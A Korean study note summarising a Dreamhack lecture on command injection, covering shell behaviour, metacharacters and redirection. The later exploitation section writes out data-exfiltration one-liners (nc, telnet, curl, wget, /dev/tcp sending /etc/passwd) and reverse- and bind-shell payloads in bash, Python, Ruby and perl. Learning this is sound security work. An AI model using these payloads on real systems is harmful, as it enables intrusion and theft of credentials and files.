# Web Hacking: Server-side Advanced - Command Injection
🔖 출처
* [Dreamhack Lecture] Server-side Advanced - Command Injection [🔗](https://dreamhack.io/lecture/courses/28)

<br/><br/>

## Overview: Command Injection
📌 Command Injection Basic [🔗](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/Web%20Hacking%3A%20Server-side%20Basic.md#command-injection)
* Command Injection: 이용자의 입력을 시스템 명령어로 실행하게 하는 취약점
    - 명령어를 실행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생함
    - 공격에 사용되면 웹 애플리케이션에 임의 명령어를 실행할 수 있어 공격 파급력이 높음
    - Command Injection 방지 방법
        + 입력 값에 대한 메타 문자의 유무를 철저히 검사함
        + 시스템 메타 문자를 해석하지 않고 그대로 사용하는 함수를 사용할 것을 권장함

<br/><br/><br/>

## Shell
* 운영체제(OS)에서 커널과 사용자의 입/출력을 담당하는 시스템 프로그램
    - 사용자가 입력하는 데이터를 해석한 후 커널(Kernel)에 요청하고, 요청에 대한 결과르 사용자에게 반환함
        + Windows/Linux에서 사용자가 콘솔을 통해 입력한 명령어를 처리하는 것이 대표적인 예시임
    - 📌 ***OS 명령어는 쉘 위에서 동작하므로 쉘의 영향을 받음 → Command Injection을 위해서는 쉘에 대한 이해가 필수적임***

<br/><br/>

### OS 명령어와 Shell: 어플리케이션에서 OS 명령어를 호출하는 코드를 실행한 상황을 디버깅 툴을 통해 확인함
| 언어 | 코드 |
|:---:|------|
| php | ```$ strace -f php -r "system('id');"``` <br/> ```execve("/usr/bin/php", ["php", "-r", "system('id');"], [/* 28 vars */]) = 0``` <br/> ```...``` <br/> ```lseek(2, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)``` <br/> ```pipe2([4, 5], O_CLOEXEC) = 0``` <br/> ```clone(child_stack=0, flags=CLONE_CHILD_CLEARTID\|CLONE_CHILD_SETTID\|SIGCHLD, child_tidptr=0x7f9b32033a10) = 10980``` <br/> ```close(5)             = 0``` <br/> ```fcntl(4, F_SETFD, 0) = 0``` <br/> ```read(4, strace: Process 10980 attached``` <br/> ``` <unfinished ...>``` <br/> ```[pid 10980] set_robust_list(0x7f9b32033a20, 24) = 0``` <br/> ```[pid 10980] dup2(5, 1) = 1``` <br/> ```[pid 10980] execve("/bin/sh", ["sh", "-c", "id"], [/* 28 vars */]) = 0``` |
| python | ```$ strace -f python -c "import os;os.system('id')"``` <br/> ```execve("/usr/bin/python", ["python", "-c", "import os;os.system('id')"], [/* 28 vars */]) = 0``` <br/> ```...``` <br/> ```clone(child_stack=0, flags=CLONE_PARENT_SETTID\|SIGCHLD, parent_tidptr=0x7ffc2d43dd3c) = 11542``` <br/> ```wait4(11542, strace: Process 11542 attached``` <br/> ``` <unfinished ...>``` <br/> ```[pid 11542] rt_sigaction(SIGINT, {0x535940, [], SA_RESTORER, 0x7f9cb22ea4b0}, NULL, 8) = 0``` <br/> ```[pid 11542] rt_sigaction(SIGQUIT, {SIG_DFL, [], SA_RESTORER, 0x7f9cb22ea4b0}, NULL, 8) = 0``` <br/> ```[pid 11542] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0``` <br/> ```[pid 11542] execve("/bin/sh", ["sh", "-c", "id"], [/* 28 vars */]) = 0``` | 
* ```strace```: 어플리케이션이 사용하는 시스템 콜, Unix 시그널 발생 등을 확인할 수 있는 디버깅 툴 [🔗](https://man7.org/linux/man-pages/man1/strace.1.html)
    - ```-f``` (```--follow-forks```) 옵션: 자식 프로세스 생성 시 자식 프로세스까지도 추적하도록 함
* OS 명령어 실행 시 자식 프로세스를 생성한 후 ```execve("/bin/sh", ["sh", "-c", "id"], [/* environments */]])```를 호출하여 어플리케이션에서 요청한 명령어를 실행함 <br/> &nbsp;&nbsp; → *어플리케이션을 통해 호출한 OS 명령어 또한 쉘을 통해 실행한다는 것을 알 수 있음*
    ```linux
    sh -c "command" → -c 인자를 읽어들여 명령어를 실행함
    ```

<br/>

### Shell(쉘)의 환경 변수
* ```env``` 또는 ```export``` 등을 통해 쉘의 환경변수를 확인할 수 있음
    ```linux
    $ env
    ...
    SHELL=/bin/bash
    USER=dreamhack
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    PWD=/tmp
    LANG=en_US.UTF-8
    HOME=/home/dreamhack
    OLDPWD=/
    _=/usr/bin/env
    ...
    ```
    - 환경변수에는 ```PATH``` 변수가 설정되어 있음 <br/> &nbsp;&nbsp; → 사용자가 명령어를 입력하면 해당 ```PATH``` 변수에 설정되어 있는 경로 중 해당 명령어의 위치를 찾아 실행함 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **→ 📌 쉘에서 명령어를 사용할 때 전체 경로를 사용하지 않고 명령어만 이동하더라도 명령어를 실행시킬 수 있음**
    - 이 외에도 현재 쉘에 대한 정보(```SHELL```), 현재 경로(```PWD```), 이전 경로(```OLDPWD```) 등 다양한 정보가 포함되어 있음

<br/>

* ```which```, ```whereis``` 명령어: 인자로 입력된 명령어의 실제 위치를 찾아 반환함
    - 예시 1: 디렉터리의 목록을 출력하는 ```ls``` 명령어
        ```linux
        $ which ls
        /bin/ls

        $ whereis ls
        ls: /bin/ls /usr/share/man/ma1/ls.1.gz
        ```
        + 결과를 통해 ```ls``` 명령어의 실제 위치가 ```/bin/ls```임을 알 수 있음
    - 예시 2: 현재 디렉터리를 변경하는 ```cd``` 명령어
        ```linux
        $ which cd
        $ whereis cd
        cd:
        ```
        + ```which```, ```whereis``` 명령어의 결과로 ```cd``` 명령어의 위치가 출력되지 않음 <br/> &nbsp;&nbsp; → 실제 위치가 존재하지 않는 명령어이지만, 쉘의 내장 명령어(shell builtin)로서 쉘을 통해 명령어를 실행할 경우 사용할 수 있는 명령어
            - 💡 **Shell builtin**
                + ```cd``` 외에도 다양한 명령어들이 해당됨
                + 해당 내장 명령어들은 ```man``` 명령어(```man bash```)를 통해 쉘 메뉴얼에서 확인할 수 있음

<br/><br/>

### Command Injection 취약점 공격 시 유용하게 사용 가능한 메타 문자들의 목록
* Directory (Location)
    | 문자 | 설명 |
    |:---:|------|
    | ```.``` | 현재 디렉터리 |
    | ```..``` | 상위 디렉터리 |
    | ```~``` | 사용자의 홈 디렉터리(home directory) |
    | ```-``` | 이전 작업 디렉터리 (rollback) |
    - 예시
        ```linux
        $ pwd
        /tmp → pwd(print working directory) 명령어로 현재 작업 중인 디렉터리의 이름을 출력함
        $ cd ..; pwd
        / → cd .. 명령어로 현재 디렉터리에서 상위 디렉터리로 이동함
        $ cd ~; pwd 
        /home/userA → cd ~ 명령어로 홈 디렉터리로 이동함
        ```

<br/>

* Sequence expression: ```..```
    - ``시작..끝``형식으로 사용하며, 문자와 정수 범위를 만드는 데 사용함
    - 예시
        ```linux
        $ echo {1..10} 
        1 2 3 4 5 6 7 8 9 10 → 1에서 10까지의 숫자를 echo 명령어를 통해 터미널에 출력함
        ```

<br/>

* Redirection
    - Output redirection: ```>```, ```>>```
        + Write mode(덮어쓰기): ```>```
            - ```명령어 > 파일``` 형식으로 사용하며, 명령어의 표준 출력 스트림의 도착 지점을 파일로 설정함 (덮어쓰기)
            - 예시
                ```linux
                $ id > /tmp/res.txt → 사용자 및 그룹 ID를 출력하는 id 명령어의 결과를 res.txt 파일에 저장함
                $ cat /tmp/res.txt → 파일의 내용을 화면에 출력하는 cat 명령어를 이용해 res.txt 파일을 출력함
                uid=1000(users) gid=1000(users) groups=1000(users)
                ``` 
        + Append mode(추가): ```>>```
            - ```명령어 >> 파일``` 형식으로 사용하며, 명령어의 표준 출력 스트림의 도착지점 파일의 뒷부분에 내용을 추가함
            - 예시
                ```linux
                $ echo 'hello world!' >> /tmp/res.txt → echo 명령어의 출력 스트림을 /tmp/res.txt로 재지정하여 'hello world!' 문자열을 터미널에 출력하는 대신 res.txt 뒷부분에 추가함
                $ id >> /tmp/res.txt → id 명령어의 결과를 res.txt 파일의 뒷부분에 추가함
                $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
                hello world!
                uid=1000(users) gid=1000(users) groups=1000(users)
                ```
    - Standard output and error redirection (비표준): ```&>```
        + ```명령어 &> 파일``` 형식으로 사용하며, 명령어의 표준 출력과 표준 에러를 모두 파일에 씀 (덮어쓰기)
        + 예시
            ```linux
            $ cat /etc/pass* &> /tmp/res.txt → cat 명령어를 실행한 결과와 실행 시 발생한 에러를 res.txt 파일에 저장함 (덮어씀)
            $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
            root:x:0:0:root:/root:/bin/bash → 출력 결과
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            ...
            cat: /etc/passwd-: Permission denied → 에러
            ``` 
    - File descriptor redirection: ```>&```
        + 표준 출력(0), 표준 입력(1), 표준 오류(2)와 같은 fd 값을 이용해 출력을 재지정함
            - ```명령어 > 파일 2>&1```은 표준 출력(stout)를 파일에 쓰고, 표준 에러(2)를 백그라운드(&)로 표준 출력(1)에 보내라는 의미
        + 예시
            ```linux
            $ cat /etc/pass* > /tmp/res.txt 2>&1 → cat 명령어를 실행한 결과와 실행 시 발생한 에러를 모두 res.txt 파일에 저장함 (덮어씀)
            $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
            root:x:0:0:root:/root:/bin/bash → 출력 결과
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            ...
            cat: /etc/passwd-: Permission denied → 에러
            ```
    - Input Redirection (read mode): ```<```
        + ```명령어 < 파일``` 형식으로 사용하며, 파일로부터 입력을 받음 (입력 스트림을 파일로 지정함)
        + 예시
            ```linux
            $ cat < /etc/passwd → cat 명령어를 통해 화면에 출력할 내용을 /etc/passwd 파일로 지정함
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            bin:x:2:2:bin:/bin:/usr/sbin/nologin
            sys:x:3:3:sys:/dev:/usr/sbin/nologin
            ...
            ```

<br/>

* Brace Expansion (Group Command): ```{ }```
    - ```{ }```은 명령어 블록의 시작과 끝을 나타냄
    - 예시
        ```linux
        $ { id; ls; } > /tmp/res.txt → 명령어 블록의 출력 결과를 res.txt 파일에 작성함(덮어씀)
        $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
        uid=1000(users) gid=1000(users) groups=1000(users)
        bin
        root
        dev
        etc
        home
        ...
        ```

<br/>

* Wildcards
    - question mark: ```?```
        + 매칭되는 하나의 문자를 나타내는 와일드카드 문자로, **1개의 문자**로 대체됨
        + 예시
            ```linux
            $ ls /bin/c??
            /bin/cat → ?은 임의의 문자 하나와 매칭되므로 cat은 c??와 매칭됨
            ```
    - asterisk: ```*```
        + 매칭되는 모든 문자를 나타내는 와일드카드 문자로, **0개 이상의 문자**로 대체됨
        + 예시
            ```linux
            $ ls /bin/c*
            /bin/cat  /bin/chacl  /bin/chgrp  /bin/chmod  /bin/chown  /bin/chvt  /bin/cp  /bin/cpio
            ```

<br/><br/><br/>

## Exploit Technique (Linux)
* Command Injection 취약점을 통해 원하는 정보를 얻는 과정에서 어플리케이션 코드/설정 또는 WAF(Web Application Firewall, 웹 방화벽) 등에 의해 공격이 제한되는 상황이 발생할 수 있음
    - 공격이 제한되는 상황의 종류
        + Command Injection 취약점이 발생하여 원하는 명령어를 실행할 수 있지만 **실행 결과를 직접적으로 확인할 수 없는** 상황
        + Command Injection 취약점이 발생하는 데이터에 **사용자의 입력 값의 길이/내용이 제한**되는 상황
    - ⚠️ *명령어를 실행하는 쉘의 동작 원리와 쉘에서 사용할 수 있는 메타 문자를 활용하여 공격이 제한되는 상황들을 우회하고 정보를 얻을 수 있음*
        + 서버/시스템의 환경 및 설정에 따라 다양한 방법들이 존재함

<br/><br/>

### 실행 결과를 확인할 수 없는 상황
* Command Injection 취약점이 발생해 원하는 OS 명령어를 실행할 수 있지만, 실행 결과가 사용자에게 노출되지 않는 상황에서 활용할 수 있는 공격 방법들 <br/> &nbsp;&nbsp; → Network In/Out Bound 제한 여부와 출력 리다이렉션 가능 여부를 기준으로 다음과 같이 분류할 수 있음

<br/>

* Network In/Out Bound의 제한이 없을 때 사용할 수 있는 방법
    - **Network Outbound**: 삽입할 명령줄에 **네트워크 도구**를 함께 실행해 자신의 서버에 명령어 실행 결과를 전송함
        + 네트워크 도구를 서버에 설치할 수 있거나 설치되었을 때 사용 가능한 방법들이 이에 해당됨
        + OS 명령어를 실행한 결과를 네트워크 도구를 이용해 외부 서버로 전송하는 방법
            - nc (netstat)
                + TCP 또는 UDP 프로토콜을 사용하는 네트워크에서 데이터를 송수신하는 프로그램 <br/> &nbsp;&nbsp; → 쉘에서 제공하는 **파이프와 함께 사용**하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음
                + 예시
                    - [1] 파이프와 nc를 통해 /etc/passwd 파일의 출력 결과를 특정 IP(```127.0.0.1```), PORT(```8080```)에 전송함
                        ```linux
                        cat /etc/passwd | nc 127.0.0.1 8080
                        ```
                    - [2] nc를 이용해 해당 IP(```127.0.0.1```), PORT(```8080```)로 전송된 데이터의 내용을 확인할 수 있음
                        ```linux
                        $ nc -l -p 8080 -k -v
                        Listening on [0.0.0.0] (family 0, port 8080)
                        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42396)
                        root:x:0:0:root:/root:/bin/bash
                        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                        bin:x:2:2:bin:/bin:/usr/sbin/nologin
                        sys:x:3:3:sys:/dev:/usr/sbin/nologin
                        ...
                        ```
            - telent
                + 네트워크 연결에 사용되는 프로토콜 (클라이언트를 설치해 네트워크 연결을 시도할 수 있음) <br/> &nbsp;&nbsp; → 쉘에서 제공하는 **파이프와 함께 사용**하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음
                + 예시: /etc/passwd 파일의 출력 결과를 telnet을 이용해 ```127.0.0.1```(IP)의 ```8080```(PORT)번 포트로 전송함
                    ```linux
                    cat /etc/passwd | telnet 127.0.0.1 8080
                    ```
            - curl/wget
                + 웹 서버의 컨텐츠를 가져오는 프로그램 <br/> &nbsp;&nbsp; → 웹 서버의 컨텐츠를 가져오기 위해 서버를 방문할 때 접속 로그가 남게 되는 특징을 이용해 **명령어의 실행 결과를 웹 서버의 경로 또는 Body와 같은 영역에 포함**해 전송함
                + 예시
                    - GET Parameter에 ```ls -al``` 실행 결과(디렉터리 목록)를 포함해서 네트워크(127.0.0.1의 8080번 포트)로 전송함
                        ```linux
                        curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"
                        ```
                        + ```base65 -w0``` → 실행 결과의 개행을 제거하기 위해 base64로 인코딩하여 전달함
                    - ```ls -al``` 실행 결과(디렉터리 목록)을 POST Body에 포함해서 네트워크(127.0.0.1의 8080번 포트)로 전송함
                        ```linux
                        curl http://127.0.0.1:8080/ -d "$(ls -al)"
                        wget http://127.0.0.1:8080/ --method=POST --body-data="`ls -al`"
                        ```
            - /dev/tcp, /dev/udp
                + (bash 한정) Bash에서 지원하는 기능으로 네트워크에 연결하는 방법
                    - ```/dev/tcp``` 또는 ```/dev/udp``` 장치 경로의 하위 디렉터리로 IP 주소와 포트 번호(```/dev/tcp/{IP주소}/{PORT번호}```)를 입력하면 Bash는 해당 경로로 네트워크 연결을 시도하는 특징을 이용함 <br/> &nbsp;&nbsp; → 앞선 명령어의 실행 결과를 ```>``` 문자로 재지정(redirection)하여 해당 경로로 명령어의 실행 결과를 전송함
                + 예제: ```/dev/tcp```를 이용하여 /etc/passwd 파일의 출력 결과를 네트워크(127.0.0.1의 8080번 포트)로 전송함
                    ```linux
                    cat /etc/passwd > /dev/tcp/127.0.0.1/8080
                    ```
    - **Reverse Shell / Bind Shell**: 임의로 실행할 쉘 명령어를 네트워크를 통해 입력하거나 출력하여 공격하는 기법
        + **Reverse Shell**(리버스 쉘): 취약점이 발생하는 서버(공격 대상 서버)에서 공격자의 서버로 쉘을 연결하는 것 *→ Network Outbound*
            - sh & bash를 이용하는 방법
                + **```/dev/tcp``` 또는 ```/dev/udp``` 장치 경로**를 사용해 포트를 서비스하는 서버에 공격 대상의 서버를 실행시킬 수 있음 <br/> &nbsp;&nbsp; → 경로를 입력한 IP 주소를 가진 서버에서 특정 포트를 열고 기다린 후 명령어를 실행하면 쉘을 획득할 수 있음
                + 예시
                    - 공격 대상 서버 (victim)
                        ```linux
                        /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
                        /bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1
                        ```
                    - 공격자 서버 (attacker)
                        ```linux
                        $ nc -l -p 8080 -k -v
                        Listening on [0.0.0.0] (family 0, port 8080)
                        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
                        $ id
                        uid=1000(user1) gid=1000(user1) groups=1000(user1)
                        ```
                        + 127.0.0.1(IP 주소)를 가진 공격자 서버는 8080번 포트를 열고 공격 전에 미리 대기하고 있어야 함 <br/> &nbsp;&nbsp; → 연결을 맺게 되면 명령어를 실행하면 쉘을 획득할 수 있음
            - 특정 언어를 이용하는 방법
                + **command line에서 코드를 실행할 수 있는 Python, Rudy 등의 언어**를 이용하여 command line에서 소켓을 사용해 리버스 쉘 공격을 수행함
                + 예시: command line에 아래의 Python/Ruby 코드를 입력함
                    - Python
                        ```python
                        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                        ```
                    - Ruby
                        ```ruby
                        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8000");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
                        ```
        + **Bind Shell**(바인드 쉘): 취약점이 발생하는 서버(공격 대상 서버)에서 특정 포트로 쉘을 서비스하는 것 *→ Network Inbound*
            - nc(netcat)를 이용하는 방법
                + 버전에 따라 특정 포트에 임의 서비스를 등록할 수 있도록 제공하는 **```-e``` 옵션을 이용**해 포트를 열고 ```/bin/sh```를 실행시킴 <br/> &nbsp;&nbsp; ↳ *버전에 따라 ```-e``` 옵션을 지원하지 않을 수도 있음*
                + 예시
                    ```linux
                    nc -nlvp 8080 -e /bin/sh
                    ncat -nlvp 8080 -e/bin/sh
                    ```
            - 특정 언어(perl)를 이용하는 방법
                + 펄 스크립트를 작성해서 특정 포트를 쉘(```/bin/sh```)와 함께 바인딩할 수 있음
                + 예시
                    ```perl
                    perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
                    ```
    - **파일 생성**

<br/><br/><br/>

## Windows 환경

<br/><br/><br/>

## Command Injection Bug Cases
